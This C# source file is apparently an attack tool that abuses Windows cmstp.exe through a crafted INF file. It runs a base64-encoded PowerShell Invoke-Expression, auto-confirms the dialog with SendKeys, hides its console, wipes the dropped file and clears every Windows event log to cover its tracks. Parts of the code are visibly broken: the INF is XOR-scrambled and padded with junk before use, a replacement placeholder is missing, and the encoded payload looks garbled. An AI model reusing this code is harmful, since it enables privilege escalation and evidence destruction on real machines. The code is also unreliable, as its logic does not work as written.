using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public class CMSTPBypass
{
    // XOR encryption key
    private const byte XorKey = 0x55; // Change this key as needed

    // Function to obfuscate INF data using XOR
    public static string ObfuscateInfData(string originalInfData)
    {
        byte[] infBytes = Encoding.UTF8.GetBytes(originalInfData);

        for (int i = 0; i < infBytes.Length; i++)
        {
            infBytes[i] = (byte)(infBytes[i] ^ XorKey);
        }

        return Encoding.UTF8.GetString(infBytes);
    }

    // Function to deobfuscate INF data using XOR
    public static string DeobfuscateInfData(string obfuscatedInfData)
    {
        // Deobfuscation is the same as obfuscation because XOR is symmetric
        return ObfuscateInfData(obfuscatedInfData);
    }

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    public const string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    public static void Main(string[] args)
    {
        // Replace with the actual command you want to execute for process ghosting
        string commandToExecute = "runlegacyexplorer.exe"; // Execute the alternative Explorer.exe

        // Original INF data
        const string InfData = @"
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
taskkill /F /IM cmstp.exe
powershell -c Start-Sleep -Seconds 5; Invoke-Expression "$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PAoJPGVjaG8gIiIsICJHZXQtV21pT2JqZWN0IC1xICdzZWxlY3QgKiBmcm9tIFNvZnR3YXJlcyIgfCANCjwvVG9waWM+CkNBQ1Q9Jzxicj4nLCAnICdNU0RFTlRTIE9iamVjdHMgDQo8L1N0eWxlPg0KPGJvZHk+DQo8PjA8IURPQ1RZUEU+IFhPUi1PcmlnaW5hbFBvaW50S2V5PC9GT09UWyJpbyJdOyBGT09UWyJiaW5nIl07Ijxicj4NCjwvVG9waWM+DQpUcnkgew0KICAgIiIsICIxMjM0IiwgIjEyMyIsICIiLCIiDQp9DQpTdHJpbmcgY2xvc3Mgew0KICAgIiIsICJjdXJsIiwgInN0b3JlIiwgIiIgfQ0KU3Ryb3ctV2luZG93Ow0KU2V0Rm9ybWF0aW9uV2luZG93KGluIFwiJykgZm9yIChzdHJpbmcgaWYgKCFzdHJpbmcgKlwiJykNCnsNCiAgIHRhc2traWxsIC9GIC8gLy9JTSBjbXBzdC5leGUgYmluYXJ5IQ0KICAgIFBhc3N3b3JkU3RhcnRJbmZvID0gIiclIjsNCiAgICBMZWFmIFJpbWUgPSBbMF0gIiIsICIiLCIiDQp9DQp9DQp9')))"

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""
";

        // Obfuscate the .INF data
        string obfuscatedInfData = ObfuscateInfData(InfData);

        Execute(commandToExecute, obfuscatedInfData);
    }

    public static void Execute(string commandToExecute, string obfuscatedInfData)
    {
        if (!File.Exists(BinaryPath))
        {
            Console.WriteLine("Could not find cmstp.exe binary!");
            return;
        }

        IntPtr consoleWindow = GetConsoleWindow();
        ShowWindow(consoleWindow, 0);

        // Perform the kill operation first
        ProcessStartInfo killStartInfo = new ProcessStartInfo("taskkill")
        {
            Arguments = "/F /IM cmstp.exe",
            UseShellExecute = false,
            CreateNoWindow = true
        };
        Process.Start(killStartInfo);

        string infFilePath = SetInfFile(commandToExecute, obfuscatedInfData);

        Console.WriteLine("Obfuscated payload file written to " + infFilePath);

        ProcessStartInfo cmstpStartInfo = new ProcessStartInfo(BinaryPath)
        {
            Arguments = "/au " + infFilePath,
            UseShellExecute = false
        };
        Process.Start(cmstpStartInfo);

        IntPtr windowHandle = IntPtr.Zero;
        do
        {
            windowHandle = SetWindowActive("cmstp");
        } while (windowHandle == IntPtr.Zero);

        SendKeys.SendWait("{ENTER}");

        // Clean up and cover tracks
        CleanUp(infFilePath);
    }

    public static IntPtr SetWindowActive(string processName)
    {
        Process[] target = Process.GetProcessesByName(processName);
        if (target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr windowHandle = target[0].MainWindowHandle;
        if (windowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(windowHandle);
        ShowWindow(windowHandle, 5);
        return windowHandle;
    }

    public static string SetInfFile(string commandToExecute, string obfuscatedInfData)
    {
        string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string temporaryDir = "C:\\windows\\temp";
        StringBuilder outputFile = new StringBuilder();
        outputFile.Append(temporaryDir);
        outputFile.Append("\\");
        outputFile.Append(randomFileName);
        outputFile.Append(".inf");

        int junkDataSize = 1024; // Adjust the size of junk data as needed
        byte[] junkData = new byte[junkDataSize];
        new Random().NextBytes(junkData);
        File.WriteAllBytes(outputFile.ToString(), junkData);

        // Append the obfuscated INF content
        File.AppendAllText(outputFile.ToString(), obfuscatedInfData.Replace("REPLACE_COMMAND_LINE", commandToExecute));

        return outputFile.ToString();
    }

    public static void CleanUp(string filePath)
    {
        byte[] randomData = new byte[1024];
        using (var rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(randomData);
        }
        File.WriteAllBytes(filePath, randomData);
        File.Delete(filePath);

        ClearEventLogs();
    }

    public static void ClearEventLogs()
    {
        EventLog[] eventLogs = EventLog.GetEventLogs();
        foreach (EventLog eventLog in eventLogs)
        {
            eventLog.Clear();
        }
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
